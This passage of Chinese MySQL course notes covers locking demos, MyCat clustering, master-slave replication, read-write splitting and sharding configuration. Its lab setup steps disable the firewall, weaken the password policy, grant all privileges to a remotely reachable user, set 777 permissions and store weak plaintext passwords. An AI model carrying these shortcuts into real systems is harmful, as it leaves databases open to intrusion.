MODE;\r\n\r\n-- 修改id为1的姓名为张三三(不能修改，会出现锁的情况。只有窗口1提交事务后，才能修改成功)\r\nUPDATE student SET NAME=\'张三三\' WHERE id = 1;\r\n\r\n-- 修改id为2的姓名为李四四(修改成功，InnoDB引擎默认是行锁)\r\nUPDATE student SET NAME=\'李四四\' WHERE id = 2;\r\n\r\n-- 修改id为3的姓名为王五五(注意：InnoDB引擎如果不采用带索引的列。则会提升为表锁)\r\nUPDATE student SET NAME=\'王五五\' WHERE id = 3;\r\n\r\n-- 提交事务\r\nCOMMIT;\r\n```\r\n\r\n- 排他锁\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT语句 FOR UPDATE;\r\n```\r\n\r\n```mysql\r\n-- 窗口1\r\n/*\r\n\t排他锁：加锁的数据，不能被其他事务加锁查询或修改\r\n*/\r\n-- 开启事务\r\nSTART TRANSACTION;\r\n\r\n-- 查询id为1的数据记录，并加入排他锁\r\nSELECT * FROM student WHERE id=1 FOR UPDATE;\r\n\r\n-- 提交事务\r\nCOMMIT;\r\n```\r\n\r\n```mysql\r\n-- 窗口2\r\n-- 开启事务\r\nSTART TRANSACTION;\r\n\r\n-- 查询id为1的数据记录(普通查询没问题)\r\nSELECT * FROM student WHERE id=1;\r\n\r\n-- 查询id为1的数据记录，并加入共享锁(不能查询。因为排他锁不能和其他锁共存)\r\nSELECT * FROM student WHERE id=1 LOCK IN SHARE MODE;\r\n\r\n-- 查询id为1的数据记录，并加入排他锁(不能查询。因为排他锁不能和其他锁共存)\r\nSELECT * FROM student WHERE id=1 FOR UPDATE;\r\n\r\n-- 修改id为1的姓名为张三(不能修改，会出现锁的情况。只有窗口1提交事务后，才能修改成功)\r\nUPDATE student SET NAME=\'张三\' WHERE id=1;\r\n\r\n-- 提交事务\r\nCOMMIT;\r\n```\r\n\r\n- 注意：锁的兼容性\r\n  - 共享锁和共享锁     兼容\r\n  - 共享锁和排他锁     冲突\r\n  - 排他锁和排他锁     冲突\r\n  - 排他锁和共享锁     冲突\r\n\r\n#### 4.演示MyISAM锁\r\n\r\n- 数据准备\r\n\r\n```mysql\r\n-- 创建product表\r\nCREATE TABLE product(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(20),\r\n\tprice INT\r\n)ENGINE = MYISAM;  -- 指定存储引擎为MyISAM\r\n\r\n-- 添加数据\r\nINSERT INTO product VALUES (NULL,\'华为手机\',4999),(NULL,\'小米手机\',2999),\r\n(NULL,\'苹果\',8999),(NULL,\'中兴\',1999);\r\n```\r\n\r\n- 读锁\r\n\r\n```mysql\r\n-- 标准语法\r\n-- 加锁\r\nLOCK TABLE 表名 READ;\r\n\r\n-- 解锁(将当前会话所有的表进行解锁)\r\nUNLOCK TABLES;\r\n```\r\n\r\n```mysql\r\n-- 窗口1\r\n/*\r\n\t读锁：所有连接只能读取数据，不能修改\r\n*/\r\n-- 为product表加入读锁\r\nLOCK TABLE product READ;\r\n\r\n-- 查询product表(查询成功)\r\nSELECT * FROM product;\r\n\r\n-- 修改华为手机的价格为5999(修改失败)\r\nUPDATE product SET price=5999 WHERE id=1;\r\n\r\n-- 解锁\r\nUNLOCK TABLES;\r\n```\r\n\r\n```mysql\r\n-- 窗口2\r\n-- 查询product表(查询成功)\r\nSELECT * FROM product;\r\n\r\n-- 修改华为手机的价格为5999(不能修改，窗口1解锁后才能修改成功)\r\nUPDATE product SET price=5999 WHERE id=1;\r\n```\r\n\r\n- 写锁\r\n\r\n```mysql\r\n-- 标准语法\r\n-- 加锁\r\nLOCK TABLE 表名 WRITE;\r\n\r\n-- 解锁(将当前会话所有的表进行解锁)\r\nUNLOCK TABLES;\r\n```\r\n\r\n```mysql\r\n-- 窗口1\r\n/*\r\n\t写锁：其他连接不能查询和修改数据\r\n*/\r\n-- 为product表添加写锁\r\nLOCK TABLE product WRITE;\r\n\r\n-- 查询product表(查询成功)\r\nSELECT * FROM product;\r\n\r\n-- 修改小米手机的金额为3999(修改成功)\r\nUPDATE product SET price=3999 WHERE id=2;\r\n\r\n-- 解锁\r\nUNLOCK TABLES;\r\n```\r\n\r\n```mysql\r\n-- 窗口2\r\n-- 查询product表(不能查询。只有窗口1解锁后才能查询成功)\r\nSELECT * FROM product;\r\n\r\n-- 修改小米手机的金额为2999(不能修改。只有窗口1解锁后才能修改成功)\r\nUPDATE product SET price=2999 WHERE id=2;\r\n```\r\n\r\n#### 5.演示悲观锁和乐观锁\r\n\r\n- 悲观锁的概念\r\n\r\n  - 就是很悲观，它对于数据被外界修改的操作持保守态度，认为数据随时会修改。\r\n  - 整个数据处理中需要将数据加锁。悲观锁一般都是依靠关系型数据库提供的锁机制。\r\n  - 我们之前所学的行锁，表锁不论是读写锁都是悲观锁。\r\n\r\n- 乐观锁的概念\r\n\r\n  - 就是很乐观，每次自己操作数据的时候认为没有人会来修改它，所以不去加锁。\r\n  - 但是在更新的时候会去判断在此期间数据有没有被修改。\r\n  - 需要用户自己去实现，不会发生并发抢占资源，只有在提交操作的时候检查是否违反数据完整性。\r\n\r\n- 悲观锁和乐观锁使用前提\r\n\r\n  - 对于读的操作远多于写的操作的时候，这时候一个更新操作加锁会阻塞所有的读取操作，降低了吞吐量。最后还要释放锁，锁是需要一些开销的，这时候可以选择乐观锁。\r\n  - 如果是读写比例差距不是非常大或者系统没有响应不及时，吞吐量瓶颈的问题，那就不要去使用乐观锁，它增加了复杂度，也带来了业务额外的风险。这时候可以选择悲观锁。\r\n\r\n- 乐观锁的实现方式\r\n\r\n  - 版本号\r\n\r\n    - 给数据表中添加一个version列，每次更新后都将这个列的值加1。\r\n    - 读取数据时，将版本号读取出来，在执行更新的时候，比较版本号。\r\n    - 如果相同则执行更新，如果不相同，说明此条数据已经发生了变化。\r\n    - 用户自行根据这个通知来决定怎么处理，比如重新开始一遍，或者放弃本次更新。\r\n\r\n    ```mysql\r\n    -- 创建city表\r\n    CREATE TABLE city(\r\n    \tid INT PRIMARY KEY AUTO_INCREMENT,  -- 城市id\r\n    \tNAME VARCHAR(20),                   -- 城市名称\r\n    \tVERSION INT                         -- 版本号\r\n    );\r\n    \r\n    -- 添加数据\r\n    INSERT INTO city VALUES (NULL,\'北京\',1),(NULL,\'上海\',1),(NULL,\'广州\',1),(NULL,\'深圳\',1);\r\n    \r\n    -- 修改北京为北京市\r\n    -- 1.查询北京的version\r\n    SELECT VERSION FROM city WHERE NAME=\'北京\';\r\n    -- 2.修改北京为北京市，版本号+1。并对比版本号\r\n    UPDATE city SET NAME=\'北京市\',VERSION=VERSION+1 WHERE NAME=\'北京\' AND VERSION=1;\r\n    ```\r\n\r\n  - 时间戳\r\n\r\n    - 和版本号方式基本一样，给数据表中添加一个列，名称无所谓，数据类型需要是timestamp\r\n    - 每次更新后都将最新时间插入到此列。\r\n    - 读取数据时，将时间读取出来，在执行更新的时候，比较时间。\r\n    - 如果相同则执行更新，如果不相同，说明此条数据已经发生了变化。\r\n\r\n#### 6.锁的总结\r\n\r\n- 表锁和行锁\r\n\r\n  - 行锁：锁的粒度更细，加行锁的性能损耗较大。并发处理能力较高。InnoDB引擎默认支持！\r\n  - 表锁：锁的粒度较粗，加表锁的性能损耗较小。并发处理能力较低。InnoDB、MyISAM引擎支持！\r\n\r\n- InnoDB锁优化建议\r\n\r\n  - 尽量通过带索引的列来完成数据查询，从而避免InnoDB无法加行锁而升级为表锁。\r\n\r\n  - 合理设计索引，索引要尽可能准确，尽可能的缩小锁定范围，避免造成不必要的锁定。\r\n  - 尽可能减少基于范围的数据检索过滤条件。\r\n  - 尽量控制事务的大小，减少锁定的资源量和锁定时间长度。\r\n  - 在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁产生概率。\r\n  - 对于非常容易产生死锁的业务部分，可以尝试使用升级锁定颗粒度，通过表级锁定来减少死锁的产生。\r\n\r\n### 四、集群\r\n\r\n#### 1.集群的概念\r\n\r\n- 如今随着互联网的发展，数据的量级也是成指数的增长，从GB到TB到PB。对数据的各种操作也是愈加的困难，传统的关系型数据库已经无法满足快速查询与插入数据的需求。一台数据库服务器已经无法满足海量数据的存储需求，所以由多台数据库构成的数据库集群成了必然的方式。不过，为了保证数据的一致性，查询效率等，同时又要解决多台服务器间的通信、负载均衡等问题。\r\n- MyCat是一款数据库集群软件，是阿里曾经开源的知名产品——Cobar，简单的说，MyCAT就是：一个新颖的数据库中间件产品支持MySQL集群，提供高可用性数据分片集群。你可以像使用mysql一样使用mycat。对于开发人员来说根本感觉不到mycat的存在。MyCat不单单是支持MySQL，像常用的关系型数据库Oracle、SqlServer都支持。\r\n\r\n![07](./img/sql/mysql/MySQL高级-04-授课笔记.assets/07.png)\r\n\r\n#### 2.集群的原理\r\n\r\n- 我们来说个例子，大海捞针和一个水瓶里捞针，毋庸置疑水瓶里一定能更快找到针，因为它需要检索的范围更小。数据库集群也是如此原理，我们可以将一个数据量为300G的数据库数据平均拆分成3部分，每个数据库中只存储100G数据，此时用户搜索，先经过我们中间代理层，中间代理层同时发出3个请求执行查询，比如第1台返回100条数据，耗时3秒，第2台返回200条数据，耗时3秒，第3台返回500条数据，耗时3秒，此时中间件只需要在800条记录中进行筛选，即可检索出用户要的结果，此时耗时其实一共只有3秒，因为每台机器做运算的时候，都是同时执行。如果我们此时直接在300G的数据库查询，耗时10秒，那使用中间件进行集群的效率就非常明显\r\n\r\n![08](./img/sql/mysql/MySQL高级-04-授课笔记.assets/08.png)\r\n\r\n- MyCat的实现流程和这个流程大致相似。MyCat自身不存储数据，但用户每次链接数据库的时候，直接连接MyCat即可.所以我们MyCat自身其实就是个逻辑数据库，它自身还有表结构，表结构叫逻辑表。\r\n\r\n#### 3.Mycat环境搭建\r\n\r\n##### 3.1 Mycat下载和安装\r\n\r\n- 官网：`http://www.mycat.io/`\r\n\r\n  ![09](./img/sql/mysql/MySQL高级-04-授课笔记.assets/09.png)\r\n\r\n- 下载地址 : `http://dl.mycat.io/`\r\n\r\n  ![10](./img/sql/mysql/MySQL高级-04-授课笔记.assets/10.png)\r\n\r\n- 选择1.6.7.1的版本，下载到D盘，安装包入下图：\r\n\r\n  ![11](./img/sql/mysql/MySQL高级-04-授课笔记.assets/11.png)\r\n\r\n- 上传：使用SecureCRT的SFTP命令，将文件发送到Linux虚拟机root目录下：\r\n\r\n  ```java\r\n  sftp> put D:\\Mycat-server-1.6.7.1-release-20190627191042-linux.tar.gz \r\n  ```\r\n\r\n- 解压：解压mycat.tar.gz并查看\r\n\r\n  ```java\r\n  tar -zxvf mycat.tar.gz\r\n  cd mycat\r\n  ll\r\n  ```\r\n\r\n  ![12](./img/sql/mysql/MySQL高级-04-授课笔记.assets/12.png)\r\n\r\n- 授权：设置mycat权限\r\n\r\n  ```java\r\n  chmod -R 777 mycat\r\n  ```\r\n\r\n- 环境变量：配置环境变量\r\n\r\n  ```java\r\n  vi /etc/profile \r\n  // 添加\r\n  export MYCAT_HOME=/root/mycat\r\n  \r\n  // 使环境变量生效\r\n  source /etc/profile\r\n  ```\r\n\r\n- 启动mycat\r\n\r\n  ```java\r\n  // 进入bin目录\r\n  [root@localhost]# cd /root/mycat/bin\r\n  \r\n  // 执行启动命令\r\n  [root@localhost bin]# ./mycat start\r\n  ```\r\n\r\n- 查看：检测端口监听状况，Mycat的端口号是8066\r\n\r\n  ```java\r\n  [root@localhost bin]# netstat -ant|grep 8066\r\n  ```\r\n\r\n  ![13](./img/sql/mysql/MySQL高级-04-授课笔记.assets/13.png)\r\n\r\n- 连接：使用SQLYog连接Mycat\r\n\r\n![14](./img/sql/mysql/MySQL高级-04-授课笔记.assets/14.png)\r\n\r\n- 连接后显示：\r\n\r\n  ![15](./img/sql/mysql/MySQL高级-04-授课笔记.assets/15.png)\r\n\r\n##### 3.2 环境准备\r\n\r\n- 配置模型\r\n\r\n![16](./img/sql/mysql/MySQL高级-04-授课笔记.assets/16.png)\r\n\r\n- 克隆虚拟机\r\n\r\n![17](./img/sql/mysql/MySQL高级-04-授课笔记.assets/17.png)\r\n\r\n![18](./img/sql/mysql/MySQL高级-04-授课笔记.assets/18.png)\r\n\r\n![19](./img/sql/mysql/MySQL高级-04-授课笔记.assets/19.png)\r\n\r\n![20](./img/sql/mysql/MySQL高级-04-授课笔记.assets/20.png)\r\n\r\n![21](./img/sql/mysql/MySQL高级-04-授课笔记.assets/21.png)\r\n\r\n![22](./img/sql/mysql/MySQL高级-04-授课笔记.assets/22.png)\r\n\r\n![23](./img/sql/mysql/MySQL高级-04-授课笔记.assets/23.png)\r\n\r\n- 修改配置网卡\r\n\r\n  - 在第二个虚拟机中，生成全新mac地址\r\n\r\n  ![24](./img/sql/mysql/MySQL高级-04-授课笔记.assets/24.png)\r\n\r\n  ![25](./img/sql/mysql/MySQL高级-04-授课笔记.assets/25.png)\r\n\r\n  - 重启网络\r\n\r\n  ```linux\r\n  // 重启网络\r\n  service network restart\r\n  //查看ip地址\r\n  ip addr\r\n  ```\r\n\r\n- 修改mysql配置文件,更改uuid\r\n\r\n  - 在第二个服务器上，修改mysql的uuid\r\n\r\n  ```\r\n  // 编辑配置文件\r\n  vi /var/lib/mysql/auto.cnf\r\n  // 将server-uuid更改\r\n  ```\r\n\r\n- 启动MySQL并查看\r\n\r\n```\r\n//将两台服务器的防火墙关闭\r\nsystemctl stop firewalld\r\n\r\n//启动两台服务器的mysql\r\nservice mysqld restart\r\n\r\n//启动两台服务器的mycat\r\ncd /root/mycat/bin\r\n./mycat restart\r\n\r\n//查看监听端口\r\nnetstat -ant|grep 3306\r\nnetstat -ant|grep 8066\r\n\r\n//使用sqlyog测试连接\r\n```\r\n\r\n#### 4.主从复制\r\n\r\n- 主从复制的概念\r\n\r\n  - 为了使用Mycat进行读写分离，我们先要配置MySQL数据库的主从复制。\r\n  - 从服务器自动同步主服务器的数据，从而达到数据一致。\r\n  - 进而，我们可以写操作时，只操作主服务器，而读操作，就可以操作从服务器了。\r\n  - 原理：主服务器在处理数据时，生成binlog日志，通过对日志的备份，实现从服务器的数据同步。\r\n\r\n  ![26](./img/sql/mysql/MySQL高级-04-授课笔记.assets/26.png)\r\n\r\n- 主服务器的配置\r\n\r\n  - 在第一个服务器上，编辑mysql配置文件\r\n\r\n  ```\r\n  // 编辑mysql配置文件\r\n  vi /etc/my.cnf\r\n  \r\n  //在[mysqld]下面加上：\r\n  log-bin=mysql-bin # 开启复制操作\r\n  server-id=1 # master is 1\r\n  innodb_flush_log_at_trx_commit=1\r\n  sync_binlog=1\r\n  ```\r\n\r\n  - 登录mysql，创建用户并授权\r\n\r\n  ```\r\n  // 登录mysql\r\n  mysql -u root -p\r\n  \r\n  // 去除密码权限\r\n  SET GLOBAL validate_password_policy=0;\r\n  SET GLOBAL validate_password_length=1;\r\n  \r\n  // 创建用户\r\n  CREATE USER \'hm\'@\'%\' IDENTIFIED BY \'itheima\';\r\n  \r\n  // 授权\r\n  GRANT ALL ON *.* TO \'hm\'@\'%\';\r\n  ```\r\n\r\n  - 重启mysql服务，登录mysql服务\r\n\r\n  ```\r\n  // 重启mysql\r\n  service mysqld restart\r\n  \r\n  // 登录mysql\r\n  mysql -u root -p\r\n  ```\r\n\r\n  - 查看主服务器的配置\r\n\r\n  ```\r\n  // 查看主服务器配置\r\n  show master status;\r\n  ```\r\n\r\n  ![27](./img/sql/mysql/MySQL高级-04-授课笔记.assets/27.png)\r\n\r\n- 从服务器的配置\r\n\r\n  - 在第二个服务器上，编辑mysql配置文件\r\n\r\n  ```\r\n  // 编辑mysql配置文件\r\n  vi /etc/my.cnf\r\n  \r\n  // 在[mysqld]下面加上：\r\n  server-id=2\r\n  ```\r\n\r\n  - 登录mysql\r\n\r\n  ```\r\n  // 登录mysql\r\n  mysql -u root -p\r\n  \r\n  // 执行\r\n  use mysql;\r\n  drop table slave_master_info;\r\n  drop table slave_relay_log_info;\r\n  drop table slave_worker_info;\r\n  drop table innodb_index_stats;\r\n  drop table innodb_table_stats;\r\n  source /usr/share/mysql/mysql_system_tables.sql;\r\n  ```\r\n\r\n  - 重启mysql，重新登录，配置从节点\r\n\r\n  ```\r\n  // 重启mysql\r\n  service mysqld restart\r\n  \r\n  // 重新登录mysql\r\n  mysql -u root -p\r\n  \r\n  // 执行\r\n  change master to master_host=\'主服务器ip地址\',master_port=3306,master_user=\'hm\',master_password=\'itheima\',master_log_file=\'mysql-bin.000001\',master_log_pos=4642;\r\n  ```\r\n\r\n  - 重启mysql，重新登录，开启从节点\r\n\r\n  ```\r\n  // 重启mysql\r\n  service mysqld restart\r\n  \r\n  // 重新登录mysql\r\n  mysql -u root -p\r\n  \r\n  // 开启从节点\r\n  start slave;\r\n  \r\n  // 查询结果\r\n  show slave status\\G;\r\n  //Slave_IO_Running和Slave_SQL_Running都为yes才表示同步成功。\r\n  ```\r\n\r\n  ![28](./img/sql/mysql/MySQL高级-04-授课笔记.assets/28.png)\r\n\r\n- 测试\r\n\r\n  - sqlyog连接主服务器\r\n\r\n  ```mysql\r\n  -- 主服务器创建db1数据库,从服务器会自动同步\r\n  CREATE DATABASE db1;\r\n  ```\r\n\r\n  - sqlyog连接从服务器\r\n\r\n  ```mysql\r\n  -- 从服务器创建db2数据库,主服务器不会自动同步\r\n  CREATE DATABASE db2;\r\n  ```\r\n\r\n- 启动失败的解决方案\r\n\r\n```\r\n启动失败：Slave_IO_Running为 NO \r\n方法一:重置slave\r\nslave stop;\r\nreset slave;\r\nstart slave ;\r\n方法二:重设同步日志文件及读取位置\r\nslave stop;\r\nchange master to master_log_file=’mysql-bin.000001’, master_log_pos=1;\r\nstart slave ;\r\n```\r\n\r\n#### 5.读写分离\r\n\r\n- 读写分离的概念\r\n  - 写操作只写入主服务器，读操作读取从服务器。\r\n\r\n- 在主服务器上修改server.xml\r\n  - user标签主要用于定义登录mycat的用户和权限。如上面定义用户名mycat和密码123456，该用户可以访问的schema的HEIMADB逻辑库。\r\n\r\n```xml\r\n<user name="root" defaultAccount="true">\r\n\t\t<property name="password">123456</property>\r\n\t\t<property name="schemas">HEIMADB</property>\r\n\t\t\r\n\t\t\x3c!-- 表级 DML 权限设置 --\x3e\r\n\t\t\x3c!-- \t\t\r\n\t\t<privileges check="false">\r\n\t\t\t<schema name="TESTDB" dml="0110" >\r\n\t\t\t\t<table name="tb01" dml="0000"></table>\r\n\t\t\t\t<table name="tb02" dml="1111"></table>\r\n\t\t\t</schema>\r\n\t\t</privileges>\t\t\r\n\t\t --\x3e\r\n</user>\r\n```\r\n\r\n- 在主服务器上修改schema.xml\r\n\r\n```xml\r\n<?xml version="1.0"?>\r\n<!DOCTYPE mycat:schema SYSTEM "schema.dtd">\r\n<mycat:schema xmlns:mycat="http://io.mycat/">\r\n\r\n\t<schema name="HEIMADB" checkSQLschema="false" sqlMaxLimit="100" dataNode="dn1"></schema>\r\n\t\r\n\t<dataNode name="dn1" dataHost="localhost1" database="db1" />\r\n\t\r\n\t<dataHost name="localhost1" maxCon="1000" minCon="10" balance="1"\r\n\t\t\t  writeType="0" dbType="mysql" dbDriver="native" switchType="1"  slaveThreshold="100">\r\n\t\t<heartbeat>select user()</heartbeat>\r\n\t\t\x3c!-- 主服务器进行写操作 --\x3e\r\n\t\t<writeHost host="hostM1" url="localhost:3306" user="root"\r\n\t\t\t\t   password="itheima">\r\n\t\t\x3c!-- 从服务器负责读操作 --\x3e\r\n\t\t<readHost host="hostS1" url="192.168.203.135:3306" user="root" password="itheima" />\r\n\t\t</writeHost>\r\n\t</dataHost>\r\n\t\r\n</mycat:schema>\r\n```\r\n\r\n- 配置详解\r\n\r\n  - schema标签逻辑库的概念和mysql数据库中Datebase的概念相同，我们在查询这两个逻辑库中的表的时候，需要切换到该逻辑库下才可以查到所需要的表。\r\n  - dataNode属性：该属性用于绑定逻辑库到某个具体的database上。\r\n  - dataNode标签： dataNode标签定义了mycat中的数据节点，也就是数据分片。一个dataNode标签就是一个独立的数据分片。\r\n  - name属性：定义数据节点的名字，这个名字需要是唯一的，我们需要在table标签上应用这个名字，来建立表与分片对应的关系。\r\n  - dataHost属性：该属性用于定义该分片属于那个数据库实例，属性值是引用datahost标签定义的name属性。\r\n  - database属性：该属性用于定义该分片属于那个具体数据库实例上的具体库，因为这里使用两个纬度来定义分片，就是：实例+具体的库。因为每个库上建立的表和表结构是一样的。所以这样做就可以轻松的对表进行水平拆分。\r\n  - dataHost标签：该标签在mycat逻辑库中也是作为最底层的标签存在，直接定义了具体的数据库实例、读写分离配置和心跳语句。\r\n\r\n  - balance属性： 负载均衡类型\r\n    ​    balance=0: 不开启读写分离，所有读操作都发送到当前可用的writeHost上。\r\n    ​    balance=1: 全部的readHost与Stand by writeHost都参与select语句的负载均衡\r\n    ​     balance=2: 所有的读操作都随机在writeHost，readHost上分发。\r\n    ​     balance=3: 所有的读请求都随机分配到writeHost对应的readHost上执行，writeHost不负担读压力。\r\n  - switchType属性： \r\n    ​    -1：表示不自动切换。\r\n    ​    1  ：默认值，表示自动切换\r\n    ​    2：表示基于MySQL主从同步状态决定是否切换，心跳语句： show slave status.\r\n    ​    3:表示基于mysql galary cluster的切换机制，适合mycat1.4之上的版本，心跳语句show status like "%esrep%";\r\n  - writeHost标签，readHost标签：这两个标签指定后端数据库的相关配置给mycat，用于实例化后端连接池。唯一不同的是，writeHost指定写实例、readHost指定读实例，组合这些读写实例来满足系统的要求。\r\n    - host属性：用于标识不同的实例，对于writehost，一般使用*M1；对于readhost一般使用*S1.\r\n    - url属性：后端实例连接地址，如果使用native的dbDriver，则一般为address:port这种形式，用JDBC或其他的dbDriver，则需要特殊指定。当使用JDBC时则可以这么写：jdbc:mysql://localhost:3306/。\r\n    - user属性：后端存储实例的用户名。\r\n    - password属性：后端存储实例的密码\r\n\r\n- 测试\r\n\r\n  - 重启主服务器的mycat\r\n\r\n  ```\r\n  // 重启mycat\r\n  cd /root/mycat/bin\r\n  \r\n  ./mycat restart\r\n  \r\n  // 查看端口监听\r\n  netstat -ant|grep 8066\r\n  ```\r\n\r\n  - sqlyog连接mycat\r\n\r\n  ```mysql\r\n  -- 创建学生表\r\n  CREATE TABLE student(\r\n  \tid INT PRIMARY KEY AUTO_INCREMENT,\r\n  \tNAME VARCHAR(10)\r\n  );\r\n  -- 查询学生表\r\n  SELECT * FROM student;\r\n  \r\n  -- 添加两条记录\r\n  INSERT INTO student VALUES (NULL,\'张三\'),(NULL,\'李四\');\r\n  \r\n  -- 停止主从复制后，添加的数据只会保存到主服务器上。\r\n  INSERT INTO student VALUES (NULL,\'王五\');\r\n  ```\r\n\r\n  - sqlyog连接主服务器\r\n\r\n  ```mysql\r\n  -- 主服务器：查询学生表，可以看到数据\r\n  SELECT * FROM student;\r\n  ```\r\n\r\n  - sqlyog连接从服务器\r\n\r\n  ```mysql\r\n  -- 从服务器：查询学生表，可以看到数据(因为有主从复制)\r\n  SELECT * FROM student;\r\n  \r\n  -- 从服务器：删除一条记录。(主服务器并没有删除，mycat中间件查询的结果是从服务器的数据)\r\n  DELETE FROM student WHERE id=2;\r\n  ```\r\n\r\n#### 6.分库分表\r\n\r\n- 分库分表的概念\r\n\r\n  - 将庞大的数据进行拆分\r\n  - 水平拆分：根据表的数据逻辑关系，将同一表中的数据按照某种条件，拆分到多台数据库服务器上，也叫做横向拆分。例如：一张1000万的大表，按照一模一样的结构，拆分成4个250万的小表，分别保存到4个数据库中。\r\n  - 垂直拆分：根据业务的维度，将不同的表切分到不同的数据库之上，也叫做纵向拆分。例如：所有的订单都保存到订单库中，所有的用户都保存到用户库中，同类型的表保存在同一库，不同的表分散在不同的库中。\r\n\r\n- Mycat水平拆分\r\n\r\n  - 修改主服务器的server.xml\r\n\r\n    - 0：本地文件方式\r\n\r\n      在mycat/conf/sequence_conf.properties文件中：\r\n      GLOBAL.MINDI=10000最小值\r\n      GLOBAL.MAXID=20000最大值，建议修改到9999999999\r\n\r\n    - 1：数据库方式\r\n\r\n      分库分表中保证全局主键自增唯一，但是需要执行mycat函数，配置sequence_db_conf.properties\r\n\r\n    - 2：时间戳方式\r\n\r\n      mycat实现的时间戳，建议varchar类型，要注意id的长度\r\n\r\n  ```xml\r\n  \x3c!-- 修改主键的方式 --\x3e\r\n  <property name="sequnceHandlerType">0</property>\r\n  ```\r\n\r\n  - 修改主服务器的sequence_conf.properties\r\n\r\n  ```properties\r\n  #default global sequence\r\n  GLOBAL.HISIDS=      # 可以自定义关键字\r\n  GLOBAL.MINID=10001  # 最小值\r\n  GLOBAL.MAXID=20000  # 最大值\r\n  GLOBAL.CURID=10000\r\n  ```\r\n\r\n  - 修改主服务器的schema.xml\r\n    - table标签定义了逻辑表，所有需要拆分的表都需要在这个标签中定义。 \r\n    - rule属性：拆分规则。mod-long是拆分规则之一，主键根据服务器数量取模，在rule.xml中指定。如果是3个数据库，那么数据取模后，平均分配到三个库中。\r\n    - name属性：定义逻辑表的表名，这个名字就如同在数据库中执行create table命令指定的名字一样，同一个schema标签中定义的表名必须是唯一的。\r\n    - dataNode属性： 定义这个逻辑表所属的dataNode，该属性的值需要和dataNode标签中name属性的值相互对应。\r\n\r\n  ```xml\r\n  <?xml version="1.0"?>\r\n  <!DOCTYPE mycat:schema SYSTEM "schema.dtd">\r\n  <mycat:schema xmlns:mycat="http://io.mycat/">\r\n  \r\n  \t<schema name="HEIMADB" checkSQLschema="false" sqlMaxLimit="100">\r\n  \t\t<table name="product" primaryKey="id" dataNode="dn1,dn2,dn3" rule="mod-long"/>\r\n  \t</schema>\r\n  \t\r\n  \t<dataNode name="dn1" dataHost="localhost1" database="db1" />\r\n  \t<dataNode name="dn2" dataHost="localhost1" database="db2" />\r\n  \t<dataNode name="dn3" dataHost="localhost1" database="db3" />\r\n  \t\r\n  \t<dataHost name="localhost1" maxCon="1000" minCon="10" balance="1"\r\n  \t\t\t  writeType="0" dbType="mysql" dbDriver="native" switchType="1"  slaveThreshold="100">\r\n  \t\t<heartbeat>select user()</heartbeat>\r\n  \t\t\x3c!-- write --\x3e\r\n  \t\t<writeHost host="hostM1" url="localhost:3306" user="root"\r\n  \t\t\t\t   password="itheima">\r\n  \t\t\x3c!-- read --\x3e\r\n  \t\t<readHost host="hostS1" url="192.168.203.135:3306" user="root" password="itheima" />\r\n  \t\t</writeHost>\r\n  \t</dataHost>\r\n  \t\r\n  </mycat:schema>\r\n  ```\r\n\r\n  - 修改主服务器的rule.xml\r\n\r\n  ```xml\r\n  <function name="mod-long" class="io.mycat.route.function.PartitionByMod">\r\n  \t\t\x3c!-- 数据库的数量 --\x3e\r\n  \t\t<property name="count">3</property>\r\n  </function>\r\n  ```\r\n\r\n  - 测试\r\n\r\n    - mycat操作\r\n\r\n    ```mysql\r\n    -- 创建product表\r\n    CREATE TABLE product(\r\n    \tid INT PRIMARY KEY AUTO_INCREMENT,\r\n    \tNAME VARCHAR(20),\r\n    \tprice INT\r\n    );\r\n    \r\n    -- 添加6条数据\r\n    INSERT INTO product(id,NAME,price) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'苹果手机\',6999);\r\n    INSERT INTO product(id,NAME,price) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'华为手机\',5999); \r\n    INSERT INTO product(id,NAME,price) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'三星手机\',4999); \r\n    INSERT INTO product(id,NAME,price) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'小米手机\',3999); \r\n    INSERT INTO product(id,NAME,price) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'中兴手机\',2999); \r\n    INSERT INTO product(id,NAME,price) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'OOPO手机\',1999); \r\n    \r\n    -- 查询product表\r\n    SELECT * FROM product; \r\n    ```\r\n\r\n    - 主服务器操作\r\n\r\n    ```mysql\r\n    -- 在不同数据库中查询product表\r\n    SELECT * FROM product;\r\n    ```\r\n\r\n    - 从服务器操作\r\n\r\n    ```mysql\r\n    -- 在不同数据库中查询product表\r\n    SELECT * FROM product;\r\n    ```\r\n\r\n- Mycat垂直拆分\r\n\r\n  - 修改主服务器的schema\r\n\r\n  ```xml\r\n  <?xml version="1.0"?>\r\n  <!DOCTYPE mycat:schema SYSTEM "schema.dtd">\r\n  <mycat:schema xmlns:mycat="http://io.mycat/">\r\n  \r\n  \t<schema name="HEIMADB" checkSQLschema="false" sqlMaxLimit="100">\r\n  \t\t<table name="product" primaryKey="id" dataNode="dn1,dn2,dn3" rule="mod-long"/>\r\n  \t\t\r\n  \t\t\x3c!-- 动物类数据表 --\x3e\r\n  \t\t<table name="dog" primaryKey="id" autoIncrement="true" dataNode="dn4" />\r\n  \t\t<table name="cat" primaryKey="id" autoIncrement="true" dataNode="dn4" />\r\n      \r\n         \x3c!-- 水果类数据表 --\x3e\r\n  \t\t<table name="apple" primaryKey="id" autoIncrement="true" dataNode="dn5" />\r\n  \t\t<table name="banana" primaryKey="id" autoIncrement="true" dataNode="dn5" />\r\n  \t</schema>\r\n  \t\r\n  \t<dataNode name="dn1" dataHost="localhost1" database="db1" />\r\n  \t<dataNode name="dn2" dataHost="localhost1" database="db2" />\r\n  \t<dataNode name="dn3" dataHost="localhost1" database="db3" />\r\n  \t\r\n  \t<dataNode name="dn4" dataHost="localhost1" database="db4" />\r\n  \t<dataNode name="dn5" dataHost="localhost1" database="db5" />\r\n  \t\r\n  \t<dataHost name="localhost1" maxCon="1000" minCon="10" balance="1"\r\n  \t\t\t  writeType="0" dbType="mysql" dbDriver="native" switchType="1"  slaveThreshold="100">\r\n  \t\t<heartbeat>select user()</heartbeat>\r\n  \t\t\x3c!-- write --\x3e\r\n  \t\t<writeHost host="hostM1" url="localhost:3306" user="root"\r\n  \t\t\t\t   password="itheima">\r\n  \t\t\x3c!-- read 